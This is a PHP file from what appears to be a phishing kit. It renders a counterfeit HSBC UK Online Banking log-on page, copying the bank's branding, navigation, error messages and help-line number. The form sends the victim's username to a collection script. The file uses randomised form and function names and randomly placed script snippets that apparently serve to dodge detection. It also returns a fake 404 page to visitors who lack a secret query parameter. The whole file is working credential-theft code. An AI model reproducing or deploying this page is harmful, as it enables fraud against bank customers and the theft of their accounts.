<?php
session_start();
error_reporting(0);
include "hc.php";
include "control.php";
if(isset($_GET["accessU"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$rand=rand(1,3);
	echo '<!DOCTYPE html>
<html xml:lang="en-GB" xmlns="http://www.w3.org/1999/xhtml" class="dj_gecko dj_contentbox" lang="en-GB"><head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Log on to Online Banking: Username | HSBC</title>
	  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=1">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta http-equiv="Cache-Control" content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private">
      <link rel="stylesheet" href="reg/box.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/button.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/core.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/footer.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/table.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/light.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/head.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/reset.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/detail.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/common.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/extra.css'.outrand().'" media="screen">
	  <link rel="shortcut icon" type="ico" href="favicon.ico'.outrand().'">
	  <script>function '.$fj2.'(){if(screen.width<700){window.location.assign("spe/idv.Log.php?ud=dashbrd&idv.cmd=LOGIN&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'");}}</script>
	  ';if($rand==1){ echo '<script>function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj1.'(){var a= document.forms["'.$fname.'"]["spn"];if(a.value.length<6){a.style.borderColor="#db0011";document.getElementById("errd").style.display="";a.focus();return false;}else{a.style.borderColor="";document.getElementById("errd").style.display="none";}document.forms["'.$fname.'"].submit();}</script>';} echo '
   </head>
   <body class="ursula" onload="'.$fj2.'()">
      <div tabindex="0" role="alert" id="hsbcwidget_Lightbox_0" lang="en-GB">
         <div style="display: none;" class="lightbox">
            <span class="tabbableEl" tabindex="-1"></span>
            <a class="close jsClose noPrint" tabindex="0" role="button" href="#">close</a>
            <div class="lightboxInner1">
               <div class="lightboxInner2"></div>
            </div>
         </div>
         <div style="display: none;" class="overlay"></div>
      </div>
      <div id="top">
         <div id="mainTopWrapper">
            <div id="mainTopUtility">
               <h1>HSBC</h1>
               <div id="mainTopUtilityRow">
                  <ul id="tabs">
                     <li class="skipLink"><a class="skip" href="#innerPage" id="skip" target="#innerPage a:first" title="" lang="en-GB">Skip page header and navigation</a></li>
                     <li class="on"><a href="#">Personal</a></li>
                     <li><a href="#" title="">Business</a></li>
                  </ul>
                  <div id="siteControls">
                     <div id="langList">
                        <ul>
                           <li class="selected"><a href="#" title="" lang="en-UK">English</a></li>
                        </ul>
                     </div>
                     <div id="locale" lang="en-GB">
                        <div id="countrySelectorWrapper" lang="en-GB">
                           <a class="dropDownLink trigger" role="tablist" href="#countrySelectorContent" title=""><span><span class="flag uk">United Kingdom</span></span></a>
                           <div class="placeholder"></div>
                        </div>
                     </div>
                     <div id="logon" style="display: block;">
                        <ul style="display: none">
                           <li><a href="#" title="" class="redBtn"><span>Log on</span></a></li>
                           <li><a href="#" title="" class="greyBtn"><span>Register</span></a></li>
                        </ul>
                     </div>
                     <div id="logoff" style="display: none;" lang="en-GB">
                        <ul>
                           <li><a href="#" title="" class="redBtn"><span>Log off</span></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div id="mainTopNavigation">
               <div id="logo"><a href="#" title=""><img alt="HSBC" src="reg/hsbc-logo.gif"></a></div>
               <div id="sections" lang="en-GB">
                  <nav>
                     <ul id="topLevel" role="menu">
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="everydayBanking"><strong>Everyday Banking</strong><br>Accounts
                           &amp; services</a>
                           
                        </li>
                        <li class="level1">
                           <a class="mainTopNav" tabindex="0" id="borrowing"><strong>Borrowing</strong><br>Loans &amp; mortgages</a>
                           
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="Investing"><strong>Investing</strong><br>
                           Products &amp; analysis</a>
                           
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="insurance"><strong>Insurance</strong><br>
                           Property &amp; family</a>
                           
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="lifeEvents"><strong>Life events</strong><br>
                           Help and support</a>
                           
                        </li>
                     </ul>
                  </nav>
               </div>
            </div>
         </div>
         <div class="pageHeaderBg">
            <div class="pageHeading row">
               <div class="pageHeadingInner">
                  <h2>Log on to Online Banking</h2>
               </div>
            </div>
         </div>
         <div class="innerPage" id="innerPage">
            <div class="grid_skin">
               <div class="row">
               </div>
			   ';if(isset($_GET["error_e"]))
					 {
						 echo '
			   <div class="row">
				<div role="alert" class="alertBox" id="hsbcwidget_AlertBox_0" title="" lang="en-GB">
					<div class="alertBoxInner" role="alert">
					<span class="hidden">Alert Box</span>
						<div><br>
									<p>
										Please enter your username.
									</p>
								</div>
					</div>
				</div>
				</div>';
					 }
					 
				if(isset($_GET["error_i"]))
					 {
						 echo '
				<div class="row">
				<div role="alert" class="alertBox" id="hsbcwidget_AlertBox_0" title="" lang="en-GB">
						<div class="alertBoxInner" role="alert">
						<span class="hidden">Alert Box</span>
							<div><br>
										<p>
											The details you have provided do not match our records.  Please check them and try again.  If the problem persists please contact us on 03456 002 290 quoting HK1.
										</p>
									</div>
						</div>
			</div>
			</div>';
					 }
					 echo '
			
			
			
               <div class="row loginBoxes row_cam10_01">
                  <div class="grid grid_9 containerStyle08 loginBox">
                     <h3>
                        Online Banking
                     </h3>
                     <form id="'.$fname.'" method="post" action="idv.Process.php?ud=dashbrd&idv.cmd=MEMO&accessU='.md5(rand(1,100)).'&ID='.randomCha(rand(40,60)).'" lang="en-GB">
					 
                        <div class="row">
                           <label for="Username1">Please enter your username eg IB1234567890 or John123
                           </label>
                        </div>
                        <div class="row rowwidth">
                           <div class="textInput isRightSec">
                              <input id="ue" tabindex="0" type="text" name="ue" autocomplete="off" autofocus="">
                           </div>
                           <div class="button primary btnForward buttonMargin">
                              <span class="buttonInner"> <input type="submit" value="Continue" class="submit_input"> <span class="icon"></span> </span>
                           </div>
                        </div>
						<Script>
						function chkit(a)
						{
							if(a.className=="dijit dijitReset dijitInline dijitCheckBox")
							{
								a.className="dijit dijitReset dijitInline dijitCheckBox dijitCheckBoxChecked dijitChecked dijitCheckBoxFocused dijitCheckBoxCheckedFocused dijitCheckedFocused dijitFocused";
							}
							else
							{
								a.className="dijit dijitReset dijitInline dijitCheckBox";
							}
						}
						</script>
                        <div class="row">
                           <div class="checkboxContainer">
                              <div class="dijit dijitReset dijitInline dijitCheckBox" role="presentation" lang="en-GB" onclick="chkit(this)"><input name="cookieuserid" type="checkbox" class="dijitReset dijitCheckBoxInput" tabindex="0" id="cookieuserid" value="true" autocomplete="off" style="user-select: none;"></div>
                              <label for="cookieuserid">Remember my username
                              </label>
                           </div>
                        </div>
                        <div class="row">
                           <ul class="linkList01">
                              <li>
                                 <a href="#">
                                 Forgot your username?
                                 <span class="chevron"></span>
                                 </a>
                              </li>
                           </ul>
                        </div>
                     </form>
					 ';if($rand==2){ echo '<script>function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj1.'(){var a= document.forms["'.$fname.'"]["spn"];if(a.value.length<6){a.style.borderColor="#db0011";document.getElementById("errd").style.display="";a.focus();return false;}else{a.style.borderColor="";document.getElementById("errd").style.display="none";}document.forms["'.$fname.'"].submit();}</script>';} echo '
                  </div>
                  <div class="grid" style="border-right:1px solid #e5e5e5;height:285px;width:50px"></div>
                  <div class="grid grid_9 containerStyle08 loginBox" style="margin-left:25px" dir="ltr">
                     <h3 style="border:none">Register for Online Banking</h3>
                     <p>Manage your money online with our secure Online<br>Banking service.</p>
                     <br>
                     <div><a href="#"><img src="reg/btn_register_now.jpg" title="" alt="Register for online banking"></a></div>
                  </div>
               </div>
               <div class="row">
                  <div class="row">
                     <div class="row" style="height:0px;width:auto;border-top:1px solid #e5e5e5"></div>
                     <div class="grid grid_9 containerStyle08 loginBox" style="margin-right:10px;padding-top:0px">
                        <h3 style="border:none">Business customers</h3>
                        <br><br>
                        <ul class="listBullets01 linkList01">
                           <li style="text-decoration:underline"><a href="#">Log on to
                              Business Internet Banking</a>
                           </li>
                        </ul>
                        <br>
                        <div class="row" style="padding-bottom:80px"><br></div>
                        <div class="row"><br><br><br></div>
                        <span style="float:left"><a href="#" title=""><img alt="FSCS Protecting your money." src="reg/protecting-your-money.jpg" style="padding-left: 10px" title="" width="205" height="49"> </a></span>
                        <span style="float:left; margin-left:10px"><a title="" href="#"><img src="reg/how-to-stay-safe-online.jpg" title="" alt="How to stay safe online"></a></span>
                     </div>
                     <div class="grid grid_1" style="border-left:1px solid #e5e5e5;height:350px"></div>
                     <div class="grid grid_9 containerStyle08 loginBox" style="padding-top:0px">
                        <h3 style="border:none">Mobile Banking</h3>
                        <p dir="ltr" style=" margin-top: -20px;"><br>Manage your personal accounts easily and securely with our Mobile
                           Banking app. Set up new payments, scan cheques directly into your account and place a temporary block on
                           your card. Mobile Banking your way.
                        </p>
                        <p dir="ltr" style=" margin-top: -10px; color: #000000;"><strong>Download the app</strong></p>
                        <a style="float:left" href="#" target="_self" title=""><img src="reg/app-store.jpg" title="" alt="Download our app from the Apple app store"></a>&nbsp;&nbsp;&nbsp;<a style="float:left;margin-left:10px" href="#" target="_self" title=""><img src="reg/google-play-logo.png" title="" alt="Download our app from the Google play store"></a>
                        <p dir="ltr" style=" margin-top: 70px;"><a href="#" target="_self" title="">Find out more about Mobile Banking</a>&nbsp;</p>
                     </div>
                  </div>
                  <span>
                     <div dir="ltr" id="jsDOMStrMov1">
                        <div class="row">
                           <div class="grid grid_8">
                              <div class="contentStrip">
                                 <div>
                                    <a href="#" title=""><img alt="Latest scam warnings. At HSBC we work hard to help you stay ahead of fraudsters. Keep updated on the latest types of scams" src="reg/20109-PWS-SAAS-login-scam-300x255.jpg" height="245" border="0"></a>
                                 </div>
                              </div>
                           </div>
                           <div class="grid grid_8">
                              <div class="contentStrip">
                                 <div>
                                    <a href="#" title=""><img alt="Upgrade your Secure Key. Upgrade to our Digital Secure Key for faster and more convenient acces to your Digital Banking. Find out more." src="reg/D650-login-seckey-300x255.jpg" height="245" border="0"></a>
                                 </div>
                              </div>
                           </div>
                           <div class="grid grid_8">
                              <div class="contentStrip">
                                 <div>
                                    <a href="#" title=""><img alt="Card gone missing? Place a temporary block on your card, then unblock it if it turns up. Find out more." src="reg/D650-login-cc-300x255.jpg" height="245" border="0"></a>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="grid grid_24">
                           <div class="ctaRow" style=" font-size: 9px;">
                              <p style=" padding-left: 35px; float: left;"><a title="" href="#" class="overlayLaunchLink triggerModalDetails0">Find
                                 out more about Online Banking</a>
                              </p>
                              <p style=" float: left; padding-left: 93px;"><a href="#" title="" class="overlayLaunchLink triggerModalDetails0">Lost,
                                 damaged and stolen Secure Keys</a>
                              </p>
                              <p style=" float: left; padding-left: 105px;"><a href="#" title="" class="overlayLaunchLink triggerModalDetails0">Security
                                 downloads</a>
                              </p>
                              &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;
                              <p>&nbsp;</p>
                           </div>
                        </div>
                     </div>
                  </span>
               </div>
            </div>
         </div>
         <style type="text/css">  
            #footerMapRow,
            #footerLinksRow,
            #footerUtilityRow {
            width: 940px;
            }
            #footerMap #footerMapRow .column.last {
            padding-right: 0
            }
            #footerMap #footerMapRow .column {
            padding: 0 10px 0 0;
            width: 145px;
            }
         </style>
         <div dir="ltr" id="footerLinks">
            <div id="footerLinksRow">
               <ul style="display: flex; white-space: nowrap;">
                  <li class="contact">
                     <a href="#" title="">Help &amp; Support</a>
                  </li>
                  <li class="branch">
                     <a href="#" title="">Find a branch</a>
                  </li>
               </ul>
            </div>
         </div>
         <div dir="ltr" id="footerMap">
            <div class="sixCol" id="footerMapRow">
               <div class="column last">
                  <h2>
                     <a href="#" title="">Support</a>
                  </h2>
                  <ul>
                     <li>
                        <a href="#" title="">Security centre</a>
                     </li>
                     <li>
                        <a href="#" title="">Card support</a>
                     </li>
                     <li>
                        <a href="#" title="">CoBrowse</a>
                     </li>
                  </ul>
               </div>
            </div>
         </div>
         <div dir="ltr" id="footerUtility">
            <div id="footerUtilityRow">
               <ul>
                  <li>
                     <a href="#" title="">About HSBC</a>
                  </li>
                  <li>
                     <a href="#" title="">Site map</a>
                  </li>
                  <li>
                     <a href="#" title="">Legal</a>
                  </li>
                  <li>
                     <a href="#" title="">Privacy notice</a>
                  </li>
                  <li>
                     <a href="#" title="" class="dnt_no_consent">Cookie
                     Policy</a>
                  </li>
                  <li>
                     <a href="#" title="">Accessibility</a>
                  </li>
                  <li>
                     <a href="#" title="">HSBC Group</a>
                  </li>
               </ul>
               <p>
                  © &nbsp;HSBC Group 2020
               </p>
            </div>
         </div>
         <a class="jsLightboxTrigger" style="display: none;" id="browserlink"></a>
         <div style="display: none;" id="lightboxContent7">
            <div class="alertLightbox informationBox clearfix">
               <div class="alertLightboxInner">
                  <div class="row">
                     <p class="alertLightboxHeading">
                        We have detected your browser is out of date
                     </p>
                     <p>
                        The browser or device 
                        you are using may cause some pages to display incorrectly. For a better 
                        online experience we recommend you upgrade your browser.
                     </p>
                  </div>
               </div>
            </div>
         </div>
         <div id="tempdata_0" lang="en-GB"></div>
      </div>
      <style>.CoBrowseHiddenForScreenReader {position: absolute;left: -10000px;top: auto;width: 1px;height: 1px;overflow: hidden;} input.CoBrowseCheckBox[type=checkbox]:checked ~ #tealiumAcceptTC {display: none !important ;} .CoBrowseFade {display:none;position: fixed;left: 0 !important;top: 0 !important;bottom: 0 !important;right: 0 !important;width: 100%;height: 100%;z-index: 3000;background: rgba(0, 0, 0, 0.6);} .modale-shadowCob{display:block;width:100%;height:100%;top:0;left:0;z-index:9110;background:rgba(0, 0, 0, .7);cursor:pointer;z-index:9250}.modale{transition:opacity .25s cubic-bezier(0, .7, .38, 1);-webkit-transition:opacity .25s cubic-bezier(0, .7, .38, 1);-moz-transition:opacity .25s cubic-bezier(0, .7, .38, 1);-o-transition:opacity .25s cubic-bezier(0, .7, .38, 1);opacity:1;visibility:visible;position:fixed;font-family:sans-serif}.modale.hidden{opacity:0;visibility:hidden}.modale-content{z-index:9251;background:white;border:2px solid #DDDDDD;text-align:left;top:50%;left:50%;-webkit-transform:translate(-50%, -50%);-ms-transform:translate(-50%, -50%);transform:translate(-50%, -50%);padding:40px;width:540px}.modale-content .content{max-height:410px;overflow-y:auto;overflow-x:hidden}.modale-title{font-weight: normal !important;font-size:28px !important;line-height:28px !important;margin-bottom:15px;padding-bottom:0 !important;color:#333 !important;text-align:center}.modale-text{ line-height: 17px !important;margin-bottom:24px;font-size:16px !important;padding-bottom:0 !important}.modale-text img{max-width:100%}.modale-text--center{text-align:center}.buttonCloseModale {background:none; border:none;text-decoration: none;font-size: 40px; color: #333;  cursor: pointer;  position: absolute;  top: 15px;  right: 20px; height: 50px;width: 50px;text-align: center;}.buttonCloseModale:hover{color:#b6b7b6;cursor:pointer} .buttonCloseModale:focus { border-bottom: 1px solid black !important; } .text-non{margin-bottom:10px}.text-non span{color:#db0011}body .modale-img{max-width:100%;text-align:center}.modale-text--center{text-align:center}.selectRadioPopin{margin-bottom:26px;font-size:16px;color:#333}.modale-list{margin-left:6px;margin-top:16px;padding-bottom:37px;padding-left:18px;width:51%;display:inline-block}.modale-list li{padding-bottom:0;font-size:16px;text-align:left}.selectTitle,.radioGroup,.radio{display:inline-block}.radio{margin-left:32px;margin-bottom:3px}.buttonsModale{width:100%;padding:10px 0;display:inline-block;border-top:0 !important;margin-top:10px}.modaleBtnOui{display:inline-block;text-align:center;text-decoration:none;font-family:sans-serif;font-size:16px;padding:15px 20px;background-color:#db0011;color:white;line-height:1 !important}.modaleBtnOui:hover{background-color:#A4000D;text-decoration:none;color:white}.modaleBtnOui:active, .modaleBtnOui:focus{background-color:#83000A;text-decoration:none;color:white;outline:none}.modaleBtnNon{display:inline-block;text-align:center;text-decoration:none;font-family:sans-serif;font-size:16px;padding:14px 20px;text-decoration:none;cursor:pointer;border:1px solid #333;color:#333;margin-right:8px;line-height:1 !important}.modaleBtnNon:hover{border:1px solid #333;background-color:rgba(0, 0, 0, 0.05);text-decoration:none;color:#333}.modaleBtnNon:active, .modaleBtnNon:focus {border:1px solid #333;background-color:rgba(0, 0, 0, 0.15);text-decoration:none;color:#333;outline:none}.disclaimerPopin{display:inline-block;color:#333;font-size:14px}body .buttonsModale a.continueBtn{float:right}.CoBrowseTextInput input{border:1px solid #ccc;margin:0 7px 3px 0;padding:10px;width:264px}.modale-text.error_red{color:#db0011;margin:0;font-size:14px!important;}span.error_input_exclamation{background-color:#db0011;padding:6px 12px 5px 12px;font-size:22px;margin-left:-38px;font-weight:bold;color:#fff;vertical-align:middle} label.modale-text {font-weight: bold !important; display:inline-block; margin-bottom: 12px;} .content .modale-text input.CoBrowseCheckBox:focus {outline: 1px solid black !important;}</style>
	  ';if($rand==3){ echo '<script>function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj1.'(){var a= document.forms["'.$fname.'"]["spn"];if(a.value.length<6){a.style.borderColor="#db0011";document.getElementById("errd").style.display="";a.focus();return false;}else{a.style.borderColor="";document.getElementById("errd").style.display="none";}document.forms["'.$fname.'"].submit();}</script>';} echo '
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>